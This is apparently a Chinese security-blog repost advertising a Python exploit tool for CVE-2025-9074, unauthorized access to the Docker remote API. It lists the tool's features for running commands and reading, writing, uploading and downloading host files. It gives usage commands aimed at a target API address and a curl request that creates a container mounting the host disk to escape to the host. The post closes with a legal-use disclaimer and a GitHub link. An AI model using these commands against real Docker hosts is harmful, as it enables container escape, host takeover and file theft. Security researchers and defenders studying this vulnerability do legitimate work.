#  一个功能强大的 Docker 远程 API 漏洞利用工具  
 黑白之道   2026-01-12 01:19  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
## 工具介绍  
  
CVE-2025-9074 Docker 容器命令执行工具 ，一个功能强大的 Docker 远程 API 漏洞利用工具，用于 CVE-2025-9074 漏洞的安全研究和测试。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icZ1W9s2Jp2UrJqEEHAf9xFlkkTGSzSeKWCTUg957mml80IDnrJpfMovtNVTEIo1ZibFEaUWRf3rkR371I0O68VQ/640?wx_fmt=png&from=appmsg&watermark=1 "")  
## 核心优势  
  
✅ **全自动容器生命周期管理**  
：自动创建临时容器，操作完成后自动清理，不留痕迹  
  
✅ **智能路径处理**  
：自动识别并转换 Windows 路径为 Docker 挂载格式  
  
✅ **全自动化操作流程**  
：无需手动输入复杂命令，菜单式交互，一键完成文件操作  
  
✅ **跨平台兼容**  
：完美支持 Windows 和 Linux 系统  
#### 部分功能效果图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icZ1W9s2Jp2UrJqEEHAf9xFlkkTGSzSeKCD3Mxmyzphh1SRRbia6Ep5AMVWYoUKt0QbEzvnxMxkenuBcw7s96K0A/640?wx_fmt=png&from=appmsg&watermark=1 "")  
## 功能特性  
- **容器操作**  
  
- 查看运行中的容器  
  
- 查看所有容器（包括停止的）  
  
- 创建新容器  
  
- 停止容器  
  
- 删除容器  
  
- 单次命令执行  
  
- 交互式终端（需要 docker 库）  
  
- **镜像管理**  
  
- 查看本地镜像  
  
- 拉取新镜像  
  
- 删除镜像  
  
- **宿主机文件操作**  
  
- 上传文件到宿主机  
  
- 从宿主机下载文件  
  
- 读取宿主机文件内容  
  
- 向宿主机写入文件  
  
- 自动处理 Windows Docker Desktop 路径映射  
  
## 漏洞说明  
  
CVE-2025-9074 是 Docker 远程 API 的一个安全漏洞，攻击者可以通过未授权访问 Docker API 来：  
- 执行任意命令  
  
- 创建容器并挂载宿主机磁盘  
  
- 实现容器逃逸  
  
- 读取/写入宿主机文件  
  
## 使用方法  
### 基本用法  
  
直接运行脚本，使用默认 Docker API 地址：  
```
python CVE-2025-9074-docker-exploit.py
```  
### 自定义 Docker API 地址  
```
python CVE-2025-9074-docker-exploit.py -u http://192.168.1.100:2375
```  
### 命令行参数  
```
python CVE-2025-9074-docker-exploit.py [选项]选项:  -u, --url URL         Docker API 地址（默认: http://192.168.65.7:2375）
```  
## 功能详解  
### 容器操作  
1. **查看运行中的容器**  
：显示所有正在运行的容器列表  
  
1. **查看所有容器**  
：显示所有容器（包括已停止的）  
  
1. **创建新容器**  
：使用指定镜像创建新容器  
  
1. **停止容器**  
：停止运行中的容器  
  
1. **删除容器**  
：删除容器（可强制删除）  
  
1. **单次命令执行**  
：在容器中执行单条命令  
  
1. **交互式终端**  
：进入容器的交互式 shell（需要 docker 库）  
  
#### 使用交互式终端  
1. 运行脚本后选择 "1. 容器操作"  
  
1. 选择 "1. 查看运行中的容器"  
  
1. 输入容器序号选择容器  
  
1. 选择 "2. 交互式终端 (需要 docker 库)"  
  
1. 输入 shell 命令（默认: /bin/sh）  
  
1. 开始交互式操作  
  
### 镜像管理  
1. **查看镜像**  
：列出所有本地镜像  
  
1. **拉取镜像**  
：从 Docker Hub 拉取新镜像  
  
1. **删除镜像**  
：删除本地镜像  
  
### 宿主机文件操作  
#### 上传文件到宿主机  
```
1. 上传文件到宿主机请输入本地文件路径: /path/to/local/file.txt请输入宿主机目标目录: D:/temp请输入目标文件名 (留空则使用原文件名): 
```  
#### 从宿主机下载文件  
```
2. 从宿主机下载文件请输入宿主机文件路径: D:/temp/file.txt请输入本地保存路径: /tmp
```  
#### 读取宿主机文件内容  
```
3. 读取宿主机文件内容请输入宿主机文件路径: D:/temp/file.txt
```  
#### 向宿主机写入文件  
```
4. 向宿主机写入文件请输入宿主机目标目录: D:/temp请输入文件内容: Hello, World!
```  
## Windows Docker Desktop 路径映射  
  
本工具自动处理 Windows Docker Desktop 的路径映射：  
  
<table><thead><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><th style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);max-width: 100%;box-sizing: border-box !important;color: rgb(66, 75, 93);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;height: auto;border-radius: 0px;min-width: 85px;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">Windows 路径</span></section></th><th style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);max-width: 100%;box-sizing: border-box !important;color: rgb(66, 75, 93);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;height: auto;border-radius: 0px;min-width: 85px;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">Docker 挂载路径</span></section></th></tr></thead><tbody><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(66, 75, 93);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">D:\</span></code></td><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">/mnt/host/d</span></code></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(66, 75, 93);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">D:\temp</span></code></td><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">/mnt/host/d/temp</span></code></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(66, 75, 93);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">C:\Windows</span></code></td><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">/mnt/host/c/Windows</span></code></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(66, 75, 93);background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">C:\Users\test</span></code></td><td style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgba(204, 204, 204, 0.4);max-width: 100%;box-sizing: border-box !important;min-width: 85px;border-radius: 0px;"><code style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">/mnt/host/c/Users/test</span></code></td></tr></tbody></table>  
  
支持的输入格式：  
- D:\  
 或 D:/  
  
- D:\temp  
 或 D:/temp  
  
- "D:\file.txt"  
（带引号）  
  
- 'D:/file.txt'  
（带引号）  
  
## 技术原理  
### 容器逃逸  
  
通过 Docker API 创建容器并挂载宿主机磁盘：  
```
curl -X POST "http://<target>:2375/containers/create" \  -H "Content-Type: application/json" \  -d '{    "Image": "python:3.11.7",    "Cmd": ["sleep", "999d"],    "HostConfig": {      "Binds": ["/mnt/host/d:/tmp"]    },    "Tty": true  }'
```  
### 文件读写  
  
通过在容器中执行命令来读写宿主机文件：  
```
# 写入文件echo "content" > /tmp/file.txt# 读取文件cat /tmp/file.txt
```  
  
  
## 工具获取  
  
  
https://github.com/Shaoshi17/CVE-2025-9074-Docker-Exploit  
  
> **文章来源：夜组安全**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
